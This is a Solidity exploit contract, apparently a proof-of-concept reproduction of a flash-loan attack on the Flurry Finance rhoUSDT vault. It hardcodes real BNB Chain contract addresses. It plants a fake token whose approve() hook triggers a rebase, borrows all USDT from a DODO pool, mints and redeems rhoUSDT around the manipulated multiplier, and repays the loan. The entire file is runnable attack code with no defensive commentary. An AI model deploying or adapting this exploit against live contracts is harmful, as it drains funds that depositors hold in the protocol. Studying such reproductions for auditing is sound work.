pragma solidity ^0.8.0;

import "hardhat/console.sol";
interface IVault {
    function mint(uint256 amount) external;
    function redeem(uint256 amount) external;
}
interface IRhoToken  {
    function getMultiplier() external view returns (uint256 multiplier, uint256 lastUpdate);
    function setRebasingOption(bool isRebasing) external;
}
interface IERC20{
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function decimals() external view returns (uint8);
}
interface IBank{
    function work(uint256 posId, uint256 pid, uint256 borrow, bytes calldata data) external;
}
interface IFlurryRebaseUpkeep{
    function performUpkeep(bytes calldata performData) external;
}
interface IPancakeRouter {
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
}
interface IPancakeFactory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}
interface IPancakePair {
    function transfer(address to, uint value) external returns (bool);
}
interface IDPP{
    function flashLoan(
        uint256 baseAmount,
        uint256 quoteAmount,
        address assetTo,
        bytes calldata data
    ) external;
}
contract Exploit{
    
    address public vault = 0x4BAd4D624FD7cabEeb284a6CC83Df594bFDf26Fd;
    address public rebaseUpkeep =  0xc8935Eb04ac1698C51a705399A9632c6FaeCa57f;
    address public rhoUSDT = 0xD845dA3fFc349472fE77DFdFb1F93839a5DA8C96;
    address public USDT = 0x55d398326f99059fF775485246999027B3197955;

    address public bank = 0xbEEB9d4CA070d34c014230BaFdfB2ad44A110142;
    address public strategy = 0x5085c49828B0B8e69bAe99d96a8e0FCf0A033369;

    address public dodo = 0xd69f6dBB7d75aa6089417BC6F94E6b26dd80ba1C;
    address public router = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address public factory = 0xcA143Ce32Fe78f1f7019d7d551a6402fC5350c73;

    address public pair;
    uint public MAX = 115792089237316195423570985008687907853269984665640564039457584007913129639935;

    mapping (address => mapping (address => uint256)) public allowance;
    mapping (address => uint256) public balanceOf;
    constructor(){
        balanceOf[address(this)] = 1e18;
    }
    function _transfer(address _from, address _to, uint _value) internal {
        balanceOf[_from] -= _value; 
        balanceOf[_to] += _value;
    }
    function transfer(address _to, uint256 _value) public {
        _transfer(msg.sender, _to, _value);
    }
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool success) {
        allowance[_from][msg.sender] -= _value;
        _transfer(_from, _to, _value);
        return true;
    }
    function approve(address _spender, uint _value) public returns (bool success){
        if(msg.sender == address(strategy)){
            IFlurryRebaseUpkeep(rebaseUpkeep).performUpkeep(new bytes(0));
        }
        allowance[msg.sender][_spender] = _value; 
        return true;
    }
    function init() public{
        IRhoToken(rhoUSDT).setRebasingOption(true);

        IERC20(rhoUSDT).approve(vault, MAX);
        IERC20(USDT).approve(vault, MAX);

        IERC20(USDT).approve(router, MAX);
        IERC20(address(this)).approve(router, MAX);

        IPancakeRouter(router).addLiquidity(USDT, address(this), 1e6, 1e6, 0, 0, address(this), block.timestamp);
        pair = IPancakeFactory(factory).getPair(USDT, address(this));
        IERC20(pair).transfer(strategy, 2);
    }
    function attack() public{
        IDPP(dodo).flashLoan(0, IERC20(USDT).balanceOf(dodo), address(this), new bytes(1));
    }

    function DPPFlashLoanCall(address sender, uint256 baseAmount, uint256 quoteAmount, bytes calldata data) external {
        IVault(vault).mint(IERC20(USDT).balanceOf(address(this)));

        (uint256 multiplier, ) = IRhoToken(rhoUSDT).getMultiplier();
        console.log("multiplier", multiplier );
        console.log("rhoUSDT", IERC20(rhoUSDT).balanceOf(address(this)));

        IFlurryRebaseUpkeep(rebaseUpkeep).performUpkeep(new bytes(0));
        console.log("After rebasing:");
        
        (multiplier, ) = IRhoToken(rhoUSDT).getMultiplier();      
        console.log("multiplier", multiplier );
        console.log("rhoUSDT", IERC20(rhoUSDT).balanceOf(address(this)));

        IVault(vault).redeem(IERC20(rhoUSDT).balanceOf(address(this)));
        IERC20(USDT).transfer(dodo, quoteAmount);
    }
}
